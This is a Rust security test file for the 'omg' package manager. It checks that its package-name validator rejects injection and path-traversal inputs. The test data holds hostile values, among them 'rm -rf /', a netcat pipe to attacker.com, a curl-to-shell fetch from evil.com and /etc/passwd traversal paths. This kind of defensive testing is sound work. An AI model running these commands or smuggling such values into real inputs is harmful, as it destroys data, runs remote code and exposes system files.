//! Security audit tests for omg package manager
//!
//! Tests for:
//! - Path traversal vulnerabilities
//! - Command injection vectors

#[cfg(test)]
mod command_injection_tests {
    use omg_lib::core::security::validation::{ValidationError, validate_package_name};

    /// Pin the product's own validator (`validate_package_name`,
    /// src/core/security/validation.rs) against shell-metacharacter and
    /// injection vectors. Each vector is matched to the exact rejection
    /// variant so a regression to "accepts anything" or to a generic error
    /// cannot pass.
    #[test]
    fn test_package_name_sanitization() {
        use ValidationError::*;

        let malicious: &[(&str, ValidationError)] = &[
            ("pkg; rm -rf /", PackageNameInvalidChar { character: ';' }),
            ("pkg$(whoami)", PackageNameInvalidChar { character: '$' }),
            ("pkg`id`", PackageNameInvalidChar { character: '`' }),
            ("pkg\n/bin/bash", PackageNameInvalidChar { character: '\n' }),
            (
                "pkg|nc attacker.com 1234",
                PackageNameInvalidChar { character: '|' },
            ),
            (
                "pkg&& curl evil.com/script.sh|sh",
                PackageNameInvalidChar { character: '&' },
            ),
            ("-dash-option-injection", PackageNameStartsWithDash),
            ("./hidden-file", PackageNameStartsWithDot),
            // Leading '.' wins over the '..' check, so cover traversal with
            // a name that gets past the hidden-file guard:
            ("pkg/../../../etc/passwd", PackageNamePathTraversal),
            ("/etc/passwd", PackageNameAbsolute),
            ("", PackageNameEmpty),
        ];

        for (name, expected) in malicious {
            assert_eq!(
                validate_package_name(name),
                Err(expected.clone()),
                "malicious package name '{name}' must be rejected with the exact \
                 documented variant"
            );
        }

        // Positive control: legitimate names must still pass, proving the
        // validator discriminates rather than rejecting everything.
        for ok in [
            "firefox",
            "lib32-mesa",
            "python312",
            "gtk4+extra",
            "perl-date-manip",
        ] {
            if let Err(e) = validate_package_name(ok) {
                panic!("legitimate package name '{ok}' must be accepted, got: {e}");
            }
        }
    }
}
